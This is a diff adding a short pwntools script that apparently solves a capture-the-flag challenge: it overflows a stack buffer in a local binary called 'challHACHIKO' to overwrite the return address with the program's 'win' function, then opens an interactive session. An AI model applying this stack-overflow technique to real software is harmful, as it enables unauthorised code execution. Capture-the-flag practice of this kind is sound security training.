@@ -1,0 +1,13 @@
+from pwn import *
+
+# bof the return address to win address
+
+p = process("./challHACHIKO")
+e = ELF("./challHACHIKO")
+
+win = e.symbols['win']
+
+payload = b'A' * 0x80 + b'B' * 0x8 + p64(win)
+p.sendafter(b"Freshman!\n", payload)
+
+p.interactive()
